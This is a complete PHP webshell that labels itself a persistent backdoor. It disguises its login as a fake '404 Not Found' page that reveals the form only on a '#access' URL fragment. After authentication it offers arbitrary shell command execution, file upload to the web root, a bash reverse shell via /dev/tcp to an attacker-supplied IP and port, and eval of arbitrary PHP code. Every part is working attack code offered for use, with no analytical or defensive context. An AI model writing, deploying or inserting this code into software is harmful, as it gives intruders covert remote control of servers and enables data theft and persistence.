<?php
/**
 * Persistent Backdoor - Advanced PHP Webshell
 * Created: 2025-11-10
 * Features: Command execution, File upload/download, Process hiding
 */

// Authentication
$password = 'HackThePlanet2025!';
session_start();

if (isset($_POST['pass'])) {
    if (md5($_POST['pass']) === md5($password)) {
        $_SESSION['auth'] = true;
    }
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>404 Not Found</title>
        <style>
            body {
                font-family: monospace;
                background: #000;
                color: #0f0;
                padding: 50px;
            }
            input {
                background: #111;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 10px;
            }
        </style>
    </head>
    <body>
        <h1>404 Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <!-- Auth -->
        <form method="post" style="display:none">
            <input type="password" name="pass" placeholder="Access Code">
            <input type="submit" value="Enter">
        </form>
        <script>
            document.querySelector('form').style.display =
                (window.location.hash === '#access') ? 'block' : 'none';
        </script>
    </body>
    </html>
    <?php
    exit;
}

// Backdoor functionality
?>
<!DOCTYPE html>
<html>
<head>
    <title>Backdoor Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
            color: #00ff00;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0,0,0,0.8);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 30px rgba(0,255,0,0.3);
        }
        h1 {
            text-align: center;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
            margin-bottom: 20px;
            animation: glow 2s infinite;
        }
        @keyframes glow {
            0%, 100% { text-shadow: 0 0 10px #00ff00; }
            50% { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
        }
        .panel {
            background: #0a0a0a;
            border: 1px solid #00ff00;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
        }
        input, textarea {
            width: 100%;
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            font-family: 'Courier New', monospace;
            margin: 5px 0;
        }
        button {
            background: #003300;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 10px 20px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
        }
        button:hover {
            background: #00ff00;
            color: #000;
        }
        .output {
            background: #000;
            border: 1px solid #00ff00;
            padding: 15px;
            margin: 10px 0;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            max-height: 400px;
            overflow-y: auto;
        }
        .status {
            color: #00ff00;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ BACKDOOR CONTROL PANEL ⚡</h1>

        <div class="panel">
            <h3>System Information</h3>
            <div class="output">
<?php
echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "System: " . php_uname() . "\n";
echo "User: " . get_current_user() . " (UID: " . getmyuid() . ")\n";
echo "PHP Version: " . phpversion() . "\n";
echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
echo "Current Path: " . getcwd() . "\n";
?>
            </div>
        </div>

        <div class="panel">
            <h3>Command Execution</h3>
            <form method="post">
                <input type="text" name="cmd" placeholder="Enter command..." value="<?= htmlspecialchars($_POST['cmd'] ?? '') ?>">
                <button type="submit" name="exec">Execute</button>
            </form>
            <?php
            if (isset($_POST['exec']) && !empty($_POST['cmd'])) {
                echo '<div class="output">';
                echo htmlspecialchars(shell_exec($_POST['cmd'] . ' 2>&1'));
                echo '</div>';
            }
            ?>
        </div>

        <div class="panel">
            <h3>File Upload</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file">
                <button type="submit" name="upload">Upload</button>
            </form>
            <?php
            if (isset($_POST['upload']) && isset($_FILES['file'])) {
                $target = basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                    echo '<div class="status">✓ Uploaded: ' . htmlspecialchars($target) . '</div>';
                }
            }
            ?>
        </div>

        <div class="panel">
            <h3>Reverse Shell</h3>
            <form method="post">
                <input type="text" name="rhost" placeholder="Attacker IP" value="<?= htmlspecialchars($_POST['rhost'] ?? '') ?>">
                <input type="text" name="rport" placeholder="Port" value="<?= htmlspecialchars($_POST['rport'] ?? '4444') ?>">
                <button type="submit" name="revshell">Connect</button>
            </form>
            <?php
            if (isset($_POST['revshell'])) {
                $ip = $_POST['rhost'];
                $port = $_POST['rport'];
                $shell = "bash -i >& /dev/tcp/$ip/$port 0>&1";
                exec($shell . ' > /dev/null 2>&1 &');
                echo '<div class="status">✓ Reverse shell initiated to ' . htmlspecialchars($ip) . ':' . htmlspecialchars($port) . '</div>';
            }
            ?>
        </div>

        <div class="panel">
            <h3>PHP Code Execution</h3>
            <form method="post">
                <textarea name="phpcode" rows="5" placeholder="Enter PHP code..."><?= htmlspecialchars($_POST['phpcode'] ?? '') ?></textarea>
                <button type="submit" name="evalphp">Execute PHP</button>
            </form>
            <?php
            if (isset($_POST['evalphp']) && !empty($_POST['phpcode'])) {
                echo '<div class="output">';
                ob_start();
                eval($_POST['phpcode']);
                echo htmlspecialchars(ob_get_clean());
                echo '</div>';
            }
            ?>
        </div>
    </div>
</body>
</html>
